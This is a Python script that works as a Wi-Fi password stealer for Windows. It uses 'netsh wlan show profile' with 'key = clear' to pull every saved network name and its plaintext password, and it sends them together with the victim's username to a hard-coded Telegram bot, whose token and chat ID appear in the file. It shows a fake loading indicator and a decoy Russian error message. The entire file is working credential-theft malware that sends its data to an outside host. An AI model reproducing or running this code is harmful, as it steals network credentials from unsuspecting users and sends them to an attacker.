import os
import subprocess
import telebot
import requests
from array import *
def bot(bot_token,chat_id,message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&parse_mode=Markdown&text={message}'
    response = requests.get(url)
def export(out, key):
    #print(out)
    slash = '\ '.replace(' ', '')
    insplit = []
    outreplc = []
    insplit.append(slash)
    insplit.append('-')
    insplit.append('(')
    insplit.append(')')
    insplit.append('b"')
    insplit.append('<')
    insplit.append('>')
    insplit.append(' ')
    for i in range(len(out)):
        strin = ''
#in here create variable to write a "byte keys"
        if out[i] == slash and i < len(out) - 4:
        #when symbol == \
            for j in range(i, i + 4):
            #append byte word in array
                if out[j] != slash:
                    strin += out[j]
            insplit.append(strin)
    for i in range(0, len(insplit)):
        #split array
        if i > 0:
            outreplc.append(outreplc[i - 1].replace(insplit[i], ''))
        else:
            outreplc.append(out.replace(insplit[i], ''))
    names = outreplc[len(outreplc) - 1].split(':')
    #print(names)
    psswd = names[len(names) - 1]

    if key == 0:
        return names
    if key == 1:
        ##print(names)
        for i in range(len(names)):
            if names[i] == 'CCMP' or key == 1:
                x = names.index('CCMP')
                return names[x + 4]
            elif names[i] == 'GCMP' or key == 1:
                y = names.index('GCMP')
                return names[y+4]


def main():

    bottoken = '5157706328:AAFkNYkqYkQh2L-HnOjZNTaQ1JloHzBgnXU'
    #id = open('id.txt', 'r')
    chat_id = '1055688529'
    out = str(subprocess.check_output('netsh wlan show profile'))
    names = export(out, 0)
    bot(bottoken,chat_id, f"❗Пользователь {os.environ['Username']} \n  ")
    print('Загрузка', end='')
    for i in range(2, len(names)):
        try:
            pic = names[i]
            if pic[len(pic)-1] == "'":

                names[i] = names[i].replace("'", '')
            outpsswd = str(subprocess.check_output(f'netsh wlan show profile name = {names[i]} key = clear'))
            print('.', end='')
            #print(f"Name: {names[i]}\n", "Password:", export(outpsswd, 1), '\n________')
            bot(bottoken, chat_id, f'Name: {names[i]}\n Password:, {export(outpsswd, 1)} \n________')
            bot(bottoken, chat_id, f"Name: {names[i]}\n password:{export(outpsswd, 1)} \n_________")

        except:
            print("Феечки не установились по причине: Ошибка 002")
    bot(bottoken, chat_id, f"🤖Обработка завершена")
if __name__ == '__main__':

    main()
